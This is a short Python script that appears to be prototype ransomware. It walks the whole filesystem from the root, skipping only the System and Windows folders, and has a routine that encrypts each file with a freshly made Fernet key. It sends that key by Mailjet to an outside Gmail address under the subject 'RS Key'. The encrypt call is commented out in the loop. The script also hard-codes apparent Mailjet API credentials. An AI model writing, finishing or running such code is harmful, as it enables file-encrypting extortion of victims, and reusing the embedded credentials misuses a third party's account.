import os
import stat
from mailjet_rest import Client
from cryptography.fernet import Fernet

api_key = '2237422b462272d7c015fb290a5c2fa5'
api_secret = '5dcb23ff37a5cd059bb9fa164d912347'

mailjet = Client(auth=(api_key, api_secret), version='v3.1')

mail = {
  'Messages': [{ "From": { "Email": "tnisomail@gmail.com", "Name": "" }, "To": [{ "Email": "g4312500@gmail.com", "Name": "" }], "Subject": "RS Key", "TextPart": "Dear passenger 1, welcome to Mailjet! May the delivery force be with you!" }]
}

def send_mail():
    result = mailjet.send.create(data=mail)
    print(result.status_code)
    print(result.json())

def generate_key():
    key = Fernet.generate_key()
    mail["Messages"][0]["TextPart"] = str(key)
    print(key)
    return Fernet(key)

def is_file_cryptable(path):
    st = os.stat(path)
    return os.path.exists(path) and bool(st.st_mode & stat.S_IRGRP)

def encrypt_file(input_file, fernet):
    try:
        with open(input_file, 'rb') as file:
            file_content = file.read()

    except FileNotFoundError:
        print(f"File not found: {input_file}")
        return

    except PermissionError:
        print(f"Permission denied: {input_file}")
        return

    except Exception as e:
        print(f"Error opening file {input_file}: {e}")
        return

    encrypted_content = fernet.encrypt(file_content)
    
    output_file = input_file + ".enc"
    with open(output_file, 'wb') as file:
        file.write(encrypted_content)

def encrypt_files_in_folder(path):
    fernet = generate_key()

    for root_folder, subfolder, files in os.walk(path):
        if (root_folder.startswith('/System') or root_folder.startswith('/Windows')):
            print(root_folder)
            continue

        for file in files:
            file_path = os.path.join(root_folder, file)
            print(file_path)
            
            # encrypt_file(file_path, fernet)

if __name__ == "__main__":
    
    encrypt_files_in_folder('/')
    send_mail()